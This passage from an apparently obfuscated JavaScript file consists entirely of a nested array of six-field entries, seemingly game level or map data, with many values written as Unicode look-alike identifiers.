			[ΔΔΔ, ⵠ[348], 39, 188, 98, ⲆΔⵠ],
			[ΔΔΔ, ⵠ[348], 37, 183, 91, ΔΔⵠ],
			[ⵠⲆΔ, ⵠ[348], 37, 186, 80, 0],
			[ᐃᐃⵠ, ⵠ[348], 37, 191, 72, 0],
			[1, ⵠ[348], 38, 184, 77, 0],
			[ΔⲆⵠ, ⵠ[348], 38, 180, 80, 0],
			[ⵠΔⲆ, ⵠ[348], 39, 173, 75, ᐃⵠΔ],
			[ⵠⲆΔ, ⵠ[348], 40, 178, 87, ⵠⲆⲆ],
			[Ⲇᐃⵠ, ⵠ[348], 40, 174, 94, Δⵠᐃ],
			[1, ⵠ[348], 40, 192, 93, 0],
			[1, ⵠ[348], 40, 165, 92, ⲆΔⵠ],
			[ⵠΔΔ, ⵠ[348], 37, 160, 89, ᐃⵠⲆ],
			[1, ⵠ[348], 38, 161, 85, 0],
			[ΔΔΔ, ⵠ[348], 38, 164, 98, 0],
			[ᐃᐃⵠ, ⵠ[348], 38, 151, 99, 0],
			[ᐃᐃⵠ, ⵠ[348], 38, 151, 85, 0],
			[1, ⵠ[348], 40, 148, 83, 0],
			[ΔΔΔ, ⵠ[348], 40, 160, 77, ᐃΔΔ],
			[1, ⵠ[348], 40, 167, 77, ⲆΔⵠ],
			[1, ⵠ[348], 40, 153, 69, 0],
			[ᐃᐃⵠ, ⵠ[348], 40, 149, 74, ΔΔⵠ],
			[ΔⲆⵠ, ⵠ[348], 37, 161, 64, 0],
			[1, ⵠ[348], 37, 154, 61, ᐃⵠⲆ],
			[ΔΔΔ, ⵠ[348], 39, 157, 55, ᐃⵠⲆ],
			[1, ⵠ[348], 39, 174, 64, Δⵠᐃ],
			[ⵠΔΔ, ⵠ[348], 39, 175, 56, ⲆΔⵠ],
			[1, ⵠ[348], 39, 149, 67, 0],
			[ⵠⲆΔ, ⵠ[348], ΔᐃⵠⲆⵠ, 218, 96, 0],
			[ΔⲆⵠ, ⵠ[348], 13, 212, 95, ᐃⵠⲆ],
			[ⵠⲆΔ, ⵠ[348], 14, 204, 85, ᐃΔΔ],
			[Ⲇᐃⵠ, ⵠ[348], 15, 215, 85, ᐃⵠⲆ],
			[1, ⵠ[348], ΔⲆⵠΔⲆⲆⵠ, 197, 97, 0],
			[ⵠΔⲆ, ⵠ[348], ⵠⲆᐃᐃⲆ, 198, 87, ⲆΔⵠ],
			[ΔΔΔ, ⵠ[348], 14, 196, 77, ΔⲆⲆ],
			[1, ⵠ[348], 13, 194, 86, 0],
			[ⵠΔⲆ, ⵠ[348], ΔⲆΔⲆⲆ, 181, 84, 0],
			[ⵠⲆΔ, ⵠ[348], ΔⵠⵠⲆⵠ, 184, 79, 0],
			[ΔΔΔ, ⵠ[348], 14, 188, 93, 0],
			[Ⲇᐃⵠ, ⵠ[348], 13, 180, 87, 0],
			[ΔⲆⵠ, ⵠ[348], 13, 178, 96, 0],
			[1, ⵠ[348], ⲆⵠΔᐃⵠ, 163, 95, 0],
			[1, ⵠ[348], 15, 172, 88, ΔΔⵠ],
			[1, ⵠ[348], ⵠⵠⵠⵠΔ, 176, 75, 0],
			[1, ⵠ[348], ⵠᐃⵠΔᐃ, 172, 72, ᐃⵠⲆ],
			[1, ⵠ[348], ⲆΔⲆⵠᐃ, 169, 82, 0],
			[1, ⵠ[348], 13, 164, 78, 0],
			[ⵠΔΔ, ⵠ[348], ⵠΔΔⵠⲆ, 158, 87, 0],
			[1, ⵠ[348], ΔⲆⵠΔⵠ, 149, 86, ⲆΔⵠ],
			[ⵠΔΔ, ⵠ[348], 15, 154, 91, ⵠⲆⲆ],
			[1, ⵠ[348], ⲆΔΔⵠⲆ, 160, 74, ᐃΔΔ],
			[1, ⵠ[348], 14, 152, 76, ᐃⵠΔ],
			[1, ⵠ[348], 14, 158, 63, ⵠⲆⲆ],
			[ⵠΔⲆ, ⵠ[348], 14, 150, 60, 0],
			[ⵠⲆΔ, ⵠ[348], ⲆΔⲆΔⲆ, 169, 59, ᐃⵠⲆ],
			[1, ⵠ[348], ⲆᐃᐃΔΔⵠⲆ, 173, 61, ⲆΔⵠ],
			[1, ⵠ[568], ⵠΔᐃ, 143, 104, 1],
			[ΔⲆⵠ, ⵠ[568], 0, 141, 102, 1],
			[ⵠΔΔ, ⵠ[568], 3, 138, 102, 1],
			[1, ⵠ[568], ΔⵠᐃⲆ, 139, 102, ᐃᐃⵠ],
			[1, ⵠ[568], ⲆⲆΔᐃ, 140, 102, ⵠΔᐃ],
			[1, ⵠ[568], ᐃⲆᐃᐃ, 143, 107, ᐃᐃⵠ],
			[ΔΔΔ, ⵠ[568], 0, 143, 106, ᐃᐃⵠ],
			[ΔⲆⵠ, ⵠ[568], 2, 143, 105, 1],
			[ᐃⲆᐃ, ⵠ[568], 2, 142, 103, ᐃⲆᐃ],
			[1, ⵠ[568], 0, 142, 104, ᐃᐃⵠ],
			[ⵠΔΔ, ⵠ[568], ⲆⲆΔᐃ, 141, 103, ⵠⲆΔ],
			[1, ⵠ[568], ⲆᐃΔᐃ, 142, 105, 1],
			[1, ⵠ[568], ᐃⲆᐃᐃ, 140, 103, ⵠⲆΔ],
			[ᐃⲆᐃ, ⵠ[568], ⵠⵠⵠᐃ, 141, 104, 1],
			[1, ⵠ[156], ⲆᐃᐃΔ, 151, 23, 1],
			[ⵠΔᐃ, ⵠ[156], 4, 150, 22, ᐃᐃⵠ],
			[1, ⵠ[156], 1, 149, 21, ⵠΔΔ],
			[ⵠΔⲆ, ⵠ[156], ᐃⵠⵠΔ, 148, 21, 1],
			[ⵠΔΔ, ⵠ[156], ᐃⲆΔⲆ, 147, ⵠᐃΔᐃᐃ, 1],
			[ᐃⲆᐃ, ⵠ[156], ⵠᐃΔΔ, 147, 19, 1],
			[ᐃⲆᐃ, ⵠ[156], ᐃΔΔⲆ, 147, 18, ΔⲆⵠ],
			[ⵠΔᐃ, ⵠ[156], 1, 147, ΔΔⲆΔᐃᐃᐃ, ΔΔΔ],
			[ⵠⲆΔ, ⵠ[156], 3, 144, ⲆⵠⲆⲆⲆ, 1],
			[1, ⵠ[156], 5, 147, 16, ᐃⲆᐃ],
			[ΔⲆⵠ, ⵠ[156], 2, 147, 15, ⵠⲆΔ],
			[1, ⵠ[156], 4, 147, 14, ⵠΔᐃ],
			[1, ⵠ[156], 4, 145, ΔⲆⲆᐃᐃ, 1],
			[1, ⵠ[156], ⲆΔΔᐃ, 145, 12, ΔΔΔ],
			[ⵠΔΔ, ⵠ[156], Ⲇᐃⵠ, 146, 13, ΔΔΔ],
			[1, ⵠ[156], 2, 145, ⲆⲆΔⵠᐃ, ⵠⲆΔ],
			[ᐃᐃⵠ, ⵠ[156], ΔⲆΔᐃ, 155, 25, 1],
			[ⵠΔΔ, ⵠ[156], 0, 155, 24, ᐃⲆᐃ],
			[ᐃᐃⵠ, ⵠ[156], 3, 153, 26, ⵠΔⲆ],
			[ⵠΔⲆ, ⵠ[568], ᐃⵠΔ, 151, 24, 1],
			[1, ⵠ[568], 0, 153, 22, ᐃⲆᐃ],
			[1, ⵠ[568], ᐃᐃⲆⲆ, 152, 22, 1],
			[ᐃᐃⵠ, ⵠ[568], 3, 154, 22, ⵠⲆΔ],
			[1, ⵠ[568], ᐃᐃⵠ, 157, 26, 1],
			[1, ⵠ[568], ⲆᐃᐃⲆ, 157, 24, 1],
			[ᐃⲆᐃ, ⵠ[568], 2, 156, 26, ⵠⲆΔ],
			[1, ⵠ[568], 2, 154, 28, ⵠΔⲆ],
			[ᐃⲆᐃ, ⵠ[568], 2, 151, 26, Ⲇᐃⵠ],
			[ⵠΔΔ, ⵠ[568], 2, 152, 25, 1],
			[1, ⵠ[568], 2, 151, 25, 1],
			[1, ⵠ[568], ⲆⲆΔᐃ, 156, 27, 1],
			[1, ⵠ[568], 2, 157, 23, 1],
			[ⵠΔΔ, ⵠ[568], ᐃⲆΔⲆ, 157, 22, 1],
			[1, ⵠ[568], ⵠⵠⵠᐃ, 150, 24, ᐃⲆᐃ],
			[ⵠΔⲆ, ⵠ[568], 3, 150, 23, 1],
			[1, ⵠ[348], 38, 155, 29, 0],
			[ΔΔΔ, ⵠ[348], 12, 157, 27, ΔΔⵠ],
			[ⵠΔΔ, ⵠ[348], ⵠⵠⵠᐃᐃ, 153, 29, ΔⲆⲆ],
			[1, ⵠ[348], ⵠⵠⵠⵠΔ, 158, 23, 0],
			[1, ⵠ[348], 13, 156, 21, ᐃⵠⲆ],
			[1, ⵠ[348], ⲆⲆΔⵠᐃ, 147, 36, ΔΔⵠ],
			[1, ⵠ[348], 13, 161, 56, 0],
			[1, ⵠ[348], 13, 147, 79, ᐃΔΔ],
			[ΔΔΔ, ⵠ[348], 12, 157, 99, 0],
			[1, ⵠ[348], ΔᐃΔⵠⵠ, 172, 99, 0],
			[ⵠⲆΔ, ⵠ[156], ⲆΔⵠⵠ, 143, 102, 1],
			[1, ⵠ[156], ⵠⲆⵠᐃ, 149, 96, 1],
			[1, ⵠ[156], 4, 145, 102, ⵠΔᐃ],
			[ᐃᐃⵠ, ⵠ[156], ⵠΔΔ, 148, 97, ⵠΔᐃ],
			[1, ⵠ[156], 5, 148, 98, 1],
			[Ⲇᐃⵠ, ⵠ[568], 3, 144, 104, ᐃⲆᐃ],
			[1, ⵠ[568], 3, 144, 103, ⵠΔΔ],
			[ᐃᐃⵠ, ⵠ[568], ΔⲆᐃⲆ, 145, 103, 1],
			[1, ⵠ[568], ᐃᐃⲆⲆ, 145, 104, 1],
			[1, ⵠ[568], 3, 142, 101, ΔΔΔ],
			[ᐃⲆᐃ, ⵠ[568], 3, 143, 100, 1],
			[1, ⵠ[568], ᐃⲆΔⵠ, 141, 101, 1],
			[ⵠΔᐃ, ⵠ[568], ᐃⲆΔⵠ, 142, 100, 1],
			[ᐃᐃⵠ, ⵠ[568], Δⵠᐃ, 141, 100, 1],
			[ⵠΔΔ, ⵠ[568], 2, 140, 101, Ⲇᐃⵠ],
			[ⵠΔⲆ, ⵠ[568], ⵠⵠΔⲆ, 144, 105, 1],
			[ⵠΔᐃ, ⵠ[568], 3, 146, 103, ⵠΔΔ],
			[ⵠΔⲆ, ⵠ[568], 3, 146, 102, ΔΔΔ],
			[1, ⵠ[568], 3, 150, 95, 1],
			[1, ⵠ[568], ᐃΔΔ, 150, 97, ᐃᐃⵠ],
			[Ⲇᐃⵠ, ⵠ[568], ᐃⲆⵠᐃ, 151, 98, ⵠⲆΔ],
			[ⵠΔⲆ, ⵠ[568], Δⵠᐃ, 153, 97, ᐃᐃⵠ],
			[1, ⵠ[568], ᐃᐃⲆⲆ, 153, 96, ⵠΔΔ],
			[Ⲇᐃⵠ, ⵠ[568], 2, 149, 95, ΔΔΔ],
			[ΔΔΔ, "s", 0, 213, 127, Ⲇᐃⵠ],
			[1, ⵠ[138], ⵠΔⲆ, 214, 131, 0],
			[1, ⵠ[138], 1, 207, 128, 0],
			[ⵠΔᐃ, ⵠ[138], 0, 208, 127, ΔⲆⲆ],
			[Ⲇᐃⵠ, "s", ⵠΔᐃ, 207, 132, Ⲇᐃⵠ],
			[1, "s", ᐃⲆΔⲆ, 208, 133, 1],
			[ΔΔΔ, ⵠ[138], 0, 217, 132, 0],
			[1, ⵠ[138], 2, 186, 158, ΔⲆⲆ],
			[1, ⵠ[138], ᐃΔΔ, 184, 160, 0],
			[1, "s", ΔⲆⵠ, 183, 156, ΔΔΔ],
			[1, "s", 2, 186, 159, ΔⲆⵠ],
			[1, "p", ⵠⲆⲆ, 182, 157, ᐃᐃⵠ],
			[ⵠΔΔ, "p", 0, 114, 205, 1],
			[1, ⵠ[138], 1, 117, 204, 0],
			[1, ⵠ[138], 0, 117, 205, 0],
			[ⵠⲆΔ, ⵠ[138], 2, 112, 204, ⵠⲆⲆ],
			[1, "s", 2, 114, 207, 1],
			[1, "s", 2, 115, 204, ⵠⲆΔ],
			[ΔΔΔ, ⵠ[138], 2, 122, 151, 0],
			[ᐃᐃⵠ, ⵠ[138], ⵠΔᐃ, 123, 150, ⲆΔⵠ],
			[1, ⵠ[138], 1, 117, 151, 0],
			[1, "s", Δⵠᐃ, 118, 150, ⵠΔΔ],
			[Ⲇᐃⵠ, "s", ᐃⲆᐃ, 122, 152, ⵠΔΔ],
			[1, ⵠ[138], 2, 156, 130, 0],
			[ΔΔΔ, ⵠ[138], 1, 154, 127, ᐃⵠΔ],
			[1, "s", Δⵠᐃ, 153, 128, 1],
			[1, "s", ⲆⲆΔᐃ, 152, 130, 1],
			[ᐃᐃⵠ, "p", ᐃΔΔ, 123, 65, 1],
			[1, ⵠ[138], 2, 125, 62, ⲆΔⵠ],
			[ⵠΔⲆ, ⵠ[138], 1, 124, 62, 0],
			[Ⲇᐃⵠ, ⵠ[138], 0, 120, 65, ΔⲆⲆ],
			[ⵠΔᐃ, "s", 1, 125, 63, 1],
			[1, "s", ΔⲆⵠ, 121, 64, ΔΔΔ],
			[1, "s", 2, 122, 62, 1],
			[ΔΔΔ, ⵠ[568], Δⵠᐃ, 140, 106, 1],
			[1, ⵠ[568], 2, 144, 106, ⵠΔᐃ],
			[1, ⵠ[568], 2, 145, 105, ΔⲆⵠ],
			[1, ⵠ[568], ⵠⵠΔⲆ, 144, 107, 1],
			[1, ⵠ[568], ᐃⲆⵠᐃ, 141, 106, ⵠΔᐃ],
			[1, ⵠ[568], ⲆᐃᐃⲆ, 141, 105, 1],
			[Ⲇᐃⵠ, ⵠ[568], 2, 140, 105, ⵠΔΔ],
			[ⵠΔⲆ, ⵠ[568], 2, 140, 104, ΔⲆⵠ],
			[1, ⵠ[568], ΔⲆⵠ, 138, 103, 1],
			[1, ⵠ[568], ⲆΔⵠ, 139, 104, 1],
			[ⵠΔⲆ, ⵠ[568], 2, 139, 103, 1],
			[ᐃⲆᐃ, ⵠ[568], ⲆᐃᐃⲆ, 139, 105, 1],
			[1, ⵠ[568], 2, 142, 106, 1],
			[1, ⵠ[568], 2, 142, 107, ΔΔΔ],
			[ᐃⲆᐃ, ⵠ[568], 2, 139, 101, 1],
			[ⵠΔΔ, ⵠ[348], 19, 27, 264, ΔⲆⲆ],
			[ⵠΔᐃ, ⵠ[156], ⵠΔᐃΔ, 147, 99, 1],
			[1, ⵠ[156], ⵠΔᐃ, 146, ΔᐃⲆⲆⲆ, ᐃⲆᐃ],
			[Ⲇᐃⵠ, ⵠ[156], 4, 145, 101, ⵠΔⲆ],
			[ⵠⲆΔ, ⵠ[568], 1, 215, 47, 1],
			[1, ⵠ[568], ⵠⵠΔⲆ, 216, 47, ⵠⲆΔ],
			[1, ⵠ[568], 2, 215, 48, 1],
			[1, ⵠ[156], 4, 214, 45, ⵠⲆΔ],
			[ᐃᐃⵠ, ⵠ[156], 4, 215, 45, ᐃⲆᐃ],
			[ⵠⲆΔ, ⵠ[156], 0, 216, 46, 1],
			[ⵠⲆΔ, ⵠ[156], 4, 216, 48, Ⲇᐃⵠ],
			[ΔΔΔ, ⵠ[156], ⲆΔⵠᐃ, 216, 49, 1],
			[ⵠⲆΔ, ⵠ[156], ⵠᐃᐃⲆ, 217, 50, 1],
			[ⵠΔΔ, ⵠ[156], 3, 214, 49, 1],
			[ⵠⲆΔ, ⵠ[156], 4, 211, 45, 1],
			[ⵠΔᐃ, ⵠ[156], ΔⲆᐃⲆ, 213, 47, 1],
			[ΔⲆⵠ, ⵠ[568], ⵠⵠΔⲆ, 224, 48, 1],
			[1, ⵠ[138], 2, 111, 243, 0],
			[ⵠΔⲆ, ⵠ[138], Ⲇᐃⵠ, 108, 246, 0],
			[ΔΔΔ, "s", 1, 110, 243, ⵠΔᐃ],
			[1, "s", 0, 108, 245, ᐃⲆᐃ],
			[Ⲇᐃⵠ, "s", ᐃⵠΔ, 121, 276, 1],
			[Ⲇᐃⵠ, ⵠ[138], 2, 122, 277, 0],
			[1, ⵠ[138], 2, 117, 276, ⵠⲆⲆ],
			[ⵠΔᐃ, ⵠ[138], 1, 118, 277, ΔⲆⲆ],
			[1, "s", 1, 118, 278, 1],
			[1, ⵠ[568], ΔⵠᐃⲆ, 66, 16, 1],
			[1, ⵠ[568], 3, 67, ΔᐃᐃΔⵠ, 1],
			[1, ⵠ[568], ᐃΔΔ, 67, ΔⵠⲆᐃⵠⲆᐃ, ⵠΔⲆ],
			[1, ⵠ[568], ᐃⲆΔⲆ, 66, 17, ⵠΔΔ],
			[1, ⵠ[568], ᐃᐃⲆⲆ, 66, ⲆⵠⲆᐃΔ, 1],
			[1, ⵠ[568], 3, 68, 17, 1],
			[1, ⵠ[568], ⵠⲆⲆ, 36, 16, 1],
			[1, ⵠ[568], 2, 36, 17, ⵠⲆΔ],
			[1, ⵠ[568], 2, 36, ⲆⵠΔⵠⵠ, 1],
			[ⵠⲆΔ, ⵠ[568], 3, 35, 17, ΔⲆⵠ],
			[ⵠⲆΔ, ⵠ[568], 3, 36, 19, 1],
			[1, ⵠ[568], ΔⲆΔᐃ, 35, 18, ⵠΔΔ],
			[ⵠⲆΔ, ⵠ[568], ⵠⵠⵠΔ, 66, 30, ⵠΔᐃ],
			[ΔΔΔ, ⵠ[568], ᐃⲆⵠᐃ, 66, 23, 1],
			[ᐃᐃⵠ, ⵠ[568], ᐃⲆΔⵠ, 66, 22, ᐃⲆᐃ],
			[1, ⵠ[568], ᐃᐃⲆⲆ, 66, 31, Ⲇᐃⵠ],
			[1, ⵠ[568], 2, 36, 30, 1],
			[ⵠΔⲆ, ⵠ[568], ΔⵠᐃⲆ, 36, 23, 1],
			[ⵠΔⲆ, ⵠ[568], 1, 36, 22, ᐃⲆᐃ],
			[ⵠⲆΔ, ⵠ[568], 2, 36, 31, 1],
			[1, ⵠ[568], 3, 42, ᐃⲆⵠᐃⲆ, 1],
			[1, ⵠ[568], 0, 43, ⵠΔΔⵠⲆ, 1],
			[ⵠΔⲆ, ⵠ[568], 2, 44, 13, 1],
			[1, ⵠ[568], ᐃᐃⲆⲆ, 42, 16, ΔⲆⵠ],
			[ⵠΔᐃ, ⵠ[568], 3, 41, ⵠΔⵠΔΔ, ᐃᐃⵠ],
			[1, ⵠ[568], ΔⲆΔᐃ, 40, ᐃⲆᐃᐃΔ, Ⲇᐃⵠ],
			[1, ⵠ[568], ⵠⲆⲆ, 42, 19, 1],
			[1, ⵠ[568], ΔⲆΔᐃ, 43, ᐃΔⲆΔⵠ, 1],
			[1, ⵠ[568], 3, 44, ΔΔⲆᐃⵠ, 1],
			[ΔΔΔ, ⵠ[568], 3, 45, 19, 1],
			[ᐃⲆᐃ, ⵠ[568], ⵠⵠΔⲆ, 46, ⵠⲆᐃΔᐃ, ΔⲆⵠ],
			[ᐃᐃⵠ, ⵠ[568], ΔⲆⲆ, 43, 22, 1],
			[ΔΔΔ, ⵠ[568], 2, 42, 22, ⵠΔᐃ],
			[1, ⵠ[568], 1, 41, 22, 1],
			[1, ⵠ[568], 0, 40, 22, ᐃᐃⵠ],
			[Ⲇᐃⵠ, ⵠ[568], 3, 39, 17, 1],
			[1, ⵠ[568], ⵠⲆΔ, 44, 26, 1],
			[ΔⲆⵠ, ⵠ[568], ⲆᐃᐃⲆ, 45, 26, 1],
			[ⵠⲆΔ, ⵠ[568], 3, 46, 26, ᐃⲆᐃ],
			[1, ⵠ[568], ⲆΔⵠ, 47, 26, ᐃⲆᐃ],
			[ΔΔΔ, ⵠ[568], ᐃⲆⵠᐃ, 48, 26, ⵠΔΔ],
			[ⵠⲆΔ, ⵠ[568], ΔⲆΔᐃ, 47, 25, 1],
			[1, ⵠ[568], ΔⲆᐃⲆ, 43, 27, ⵠΔᐃ],
			[Ⲇᐃⵠ, ⵠ[568], 1, 49, 32, 1],
			[1, ⵠ[568], ⲆᐃᐃⲆ, 50, 32, 1],
			[ⵠⲆΔ, ⵠ[568], ᐃⲆΔⲆ, 51, 32, ᐃᐃⵠ],
			[1, ⵠ[568], ⲆᐃᐃⲆ, 52, 32, 1],
			[ᐃᐃⵠ, "d", 0, 51, 29, ⵠΔΔ],
			[1, "d", 1, 53, 29, ⵠΔΔ],
			[1, "d", 1, 49, 29, ⵠΔⲆ],
			[ΔΔΔ, ⵠ[568], ᐃⲆᐃᐃ, 55, 31, 1],
			[1, ⵠ[568], ᐃⲆᐃᐃ, 54, 32, Ⲇᐃⵠ],
			[ⵠⲆΔ, ⵠ[568], 3, 47, 31, ΔⲆⵠ],
			[ᐃⲆᐃ, ⵠ[568], 3, 48, 32, ΔⲆⵠ],
			[ᐃⲆᐃ, ⵠ[568], 0, 51, 33, 1],
			[ⵠⲆΔ, ⵠ[568], 2, 52, 33, ⵠⲆΔ],
			[1, ⵠ[568], ⵠⵠΔⲆ, 50, 33, 1],
			[1, ⵠ[568], 3, 56, 30, ΔΔΔ],
			[1, ⵠ[568], ᐃᐃⲆⲆ, 56, 31, 1],
			[ᐃᐃⵠ, ⵠ[568], 3, 46, 30, 1],
			[1, ⵠ[568], ᐃᐃⲆⲆ, 46, 31, 1],
			[ᐃⲆᐃ, ⵠ[568], 1, 53, 33, 1],
			[1, ⵠ[568], ᐃⲆΔⲆ, 49, 33, ΔΔΔ],
			[1, ⵠ[568], ⵠⵠΔⲆ, 53, 32, 1],
			[1, ⵠ[568], 0, 55, 32, ᐃⲆᐃ],
			[ⵠΔⲆ, ⵠ[568], 0, 47, 32, ΔΔΔ],
			[ᐃⲆᐃ, "d", ᐃᐃⵠ, 54, 35, ᐃⲆᐃ],
			[ⵠⲆΔ, ⵠ[273], ⵠⵠΔⲆ, 35, ⵠⵠⵠⵠΔ, ᐃⵠⲆ],
			[Ⲇᐃⵠ, ⵠ[273], ⲆᐃᐃⲆ, 36, 12, ΔⲆⲆ],
			[ⵠΔΔ, ⵠ[273], ⲆⲆΔᐃ, 67, 15, 0],
			[ⵠⲆΔ, ⵠ[568], ⲆΔⵠⵠ, 60, ΔⲆⵠΔⵠ, 1],
			[ᐃᐃⵠ, ⵠ[568], 2, 59, ⲆⲆΔⵠᐃ, ⵠΔΔ],
			[ΔⲆⵠ, ⵠ[568], ⵠⲆΔ, 58, 13, 1],
			[1, ⵠ[568], 3, 62, ⵠΔⲆᐃᐃ, 1],
			[ΔⲆⵠ, ⵠ[568], 0, 61, 16, 1],
			[1, ⵠ[568], 3, 60, 16, 1],
			[1, ⵠ[568], ⵠⵠⵠᐃ, 63, ⵠᐃᐃΔᐃ, 1],
			[1, ⵠ[568], 2, 60, ⵠⲆᐃΔᐃ, 1],
			[1, ⵠ[568], ⵠⲆΔ, 59, ΔΔⵠΔⲆ, 1],
			[1, ⵠ[568], ⵠⵠⵠᐃ, 58, ⲆⲆⲆⵠᐃ, ⵠΔᐃ],
			[ⵠΔᐃ, ⵠ[568], ⲆⲆΔᐃ, 57, 19, 1],
			[1, ⵠ[568], ⵠⵠΔⲆ, 56, 19, ⵠΔⲆ],
			[1, ⵠ[568], 0, 55, 18, Ⲇᐃⵠ],
			[1, ⵠ[568], ⲆᐃᐃⲆ, 55, ⵠᐃΔΔΔⲆⲆ, 1],
			[ΔΔΔ, ⵠ[568], ⲆᐃᐃⲆ, 63, 23, 1],
			[1, ⵠ[568], ᐃⵠⲆ, 62, 22, 1],
			[ⵠⲆΔ, ⵠ[568], 2, 61, 22, ⵠΔΔ],
			[ⵠΔᐃ, ⵠ[568], ⵠΔᐃ, 60, 22, ⵠΔΔ],
			[ⵠΔᐃ, ⵠ[568], 0, 59, 22, 1],
			[1, ⵠ[568], ᐃⲆΔⲆ, 54, 26, 1],
			[ᐃⲆᐃ, ⵠ[568], 2, 55, 26, ⵠⲆΔ],
			[1, ⵠ[568], ΔⵠᐃⲆ, 56, 26, 1],
			[ΔⲆⵠ, ⵠ[568], ΔΔΔ, 57, 26, 1],
			[Ⲇᐃⵠ, ⵠ[568], ⵠⵠⵠΔ, 58, 26, 1],
			[1, ⵠ[568], 2, 59, 27, ⵠΔⲆ],
			[ⵠⲆΔ, ⵠ[568], 2, 68, 16, ⵠⲆΔ],
			[ⵠΔᐃ, ⵠ[568], ΔⵠᐃⲆ, 68, 15, 1],
			[1, ⵠ[568], 3, 69, 15, ΔΔΔ],
			[Ⲇᐃⵠ, ⵠ[568], ⵠⵠⵠᐃ, 70, ΔⲆΔⲆⲆ, 1],
			[1, ⵠ[568], ⲆᐃΔᐃ, 70, 14, 1],
			[1, ⵠ[568], ᐃⲆᐃ, 69, ⵠⵠⵠᐃᐃ, ⵠΔᐃ],
			[1, ⵠ[568], ΔΔΔ, 69, ⲆⲆⲆΔΔ, 1],
			[1, ⵠ[568], ⲆⲆΔᐃ, 71, ⵠᐃᐃΔⲆ, 1],
			[1, ⵠ[568], ⲆⲆΔᐃ, 71, ⵠᐃⵠΔᐃ, 1],
			[ⵠⲆΔ, ⵠ[568], ᐃⲆΔⵠ, 72, 13, 1],
			[1, ⵠ[568], ⲆᐃΔᐃ, 70, 8, 1],
			[ⵠⲆΔ, ⵠ[568], 3, 71, 8, 1],
			[1, ⵠ[568], ⲆⲆΔᐃ, 72, ⲆⲆᐃⵠΔ, 1],
			[1, ⵠ[568], ΔΔⵠ, 73, 8, 1],
			[1, ⵠ[568], 3, 74, ⵠᐃΔⵠΔ, 1],
			[1, ⵠ[568], ᐃⲆᐃᐃ, 74, ΔᐃᐃⲆᐃ, ᐃⲆᐃ],
			[ΔⲆⵠ, ⵠ[568], ᐃⵠⲆ, 75, ⲆᐃΔⲆⵠ, 1],
			[ⵠΔΔ, ⵠ[568], ΔⲆᐃⲆ, 76, 8, ⵠΔᐃ],
			[1, ⵠ[568], 3, 75, 9, 1],
			[1, ⵠ[568], 3, 75, 10, Ⲇᐃⵠ],
			[ᐃⲆᐃ, ⵠ[568], ⲆΔⵠ, 76, ⵠⵠⲆΔΔ, ⵠΔⲆ],
			[ⵠΔᐃ, ⵠ[568], ᐃΔΔ, 76, ΔⵠΔᐃᐃ, 1],
			[1, ⵠ[568], ᐃⲆΔⵠ, 76, Δᐃᐃᐃᐃⵠⵠ, Ⲇᐃⵠ],
			[ⵠΔΔ, ⵠ[568], ΔⲆΔᐃ, 75, 16, 1],
			[Ⲇᐃⵠ, ⵠ[568], 2, 77, 11, 1],
			[ΔⲆⵠ, ⵠ[568], 2, 77, ᐃΔᐃⲆⲆ, ⵠΔⲆ],
			[1, ⵠ[568], 3, 77, ⲆΔⵠᐃⲆ, ⵠΔᐃ],
			[ⵠΔᐃ, ⵠ[568], 3, 77, 13, 1],
			[ⵠΔⲆ, ⵠ[568], ⵠⵠⵠᐃ, 77, 15, ᐃⲆᐃ],
			[ⵠⲆΔ, ⵠ[568], 0, 74, 18, ΔⲆⵠ],
			[1, ⵠ[568], ⵠΔᐃ, 75, ᐃᐃⲆⵠΔΔᐃ, 1],
			[1, ⵠ[568], ⲆᐃᐃⲆ, 74, ⵠᐃⲆⲆⲆⲆⲆ, 1],
			[1, ⵠ[568], ᐃⲆΔⵠ, 73, ᐃⲆᐃⵠⵠ, 1],
			[1, ⵠ[568], 3, 67, 23, ⵠΔΔ],
			[1, ⵠ[568], 0, 68, 23, 1],
			[1, ⵠ[568], ΔΔⵠ, 72, ⵠΔΔⲆⲆ, ΔⲆⵠ],
			[Ⲇᐃⵠ, ⵠ[568], ᐃⲆⵠᐃ, 73, ᐃΔᐃⲆⵠ, ΔΔΔ],
			[1, ⵠ[568], 2, 74, 19, 1],
			[ᐃⲆᐃ, ⵠ[568], 2, 74, 36, 1],
			[Ⲇᐃⵠ, ⵠ[568], 2, 77, 27, ⵠΔⲆ],
			[1, ⵠ[568], ⲆⲆΔᐃ, 76, 26, 1],
			[Ⲇᐃⵠ, ⵠ[568], 2, 75, 26, ⵠⲆΔ],
			[ⵠⲆΔ, ⵠ[568], ᐃⵠⲆ, 74, 26, ⵠΔⲆ],
			[1, ⵠ[568], 2, 75, 25, ᐃⲆᐃ],
			[1, ⵠ[568], ᐃⵠⲆ, 76, 25, Ⲇᐃⵠ],
			[1, ⵠ[568], 1, 77, 23, 1],
			[1, ⵠ[568], 2, 77, ⵠΔⲆᐃᐃ, ΔⲆⵠ],
			[ᐃⲆᐃ, ⵠ[568], 2, 76, 17, 1],
			[ΔΔΔ, ⵠ[568], 2, 76, 24, ⵠΔᐃ],
			[1, ⵠ[568], ⲆᐃᐃⲆ, 77, 24, 1],
			[1, ⵠ[568], 2, 77, 25, 1],
			[1, ⵠ[568], 2, 77, 26, ⵠⲆΔ],
			[1, ⵠ[568], ΔⲆⵠ, 75, 27, ᐃᐃⵠ],
			[ⵠΔΔ, ⵠ[568], 3, 76, 27, ΔΔΔ],
			[1, ⵠ[568], ⵠⵠⵠΔ, 67, 24, ᐃⲆᐃ],
			[ⵠΔΔ, ⵠ[568], ⵠⵠⵠΔ, 66, 24, ᐃⲆᐃ],
			[1, ⵠ[568], 2, 73, 26, ᐃᐃⵠ],
			[ΔⲆⵠ, ⵠ[568], 2, 74, 27, Ⲇᐃⵠ],
			[ⵠΔᐃ, ⵠ[568], ΔⵠᐃⲆ, 74, 25, 1],
			[ⵠΔⲆ, ⵠ[568], ⵠⵠⵠΔ, 66, ΔΔⵠΔⲆ, Ⲇᐃⵠ],
			[1, ⵠ[568], 2, 66, ⵠⵠⵠⲆᐃ, 1],
			[1, ⵠ[568], ΔⵠᐃⲆ, 66, 21, ᐃⲆᐃ],
			[ΔΔΔ, ⵠ[568], 2, 67, ᐃᐃᐃᐃⲆ, 1],
			[1, ⵠ[568], ᐃⲆΔⲆ, 67, 22, ᐃᐃⵠ],
			[1, ⵠ[568], ΔΔⵠ, 77, 36, 1],
			[1, ⵠ[568], 0, 77, 32, 1],
			[1, ⵠ[568], 1, 75, 35, ⵠΔᐃ],
			[1, ⵠ[568], 2, 75, 36, ⵠΔΔ],
			[1, ⵠ[568], ⵠⵠΔⲆ, 76, 36, 1],
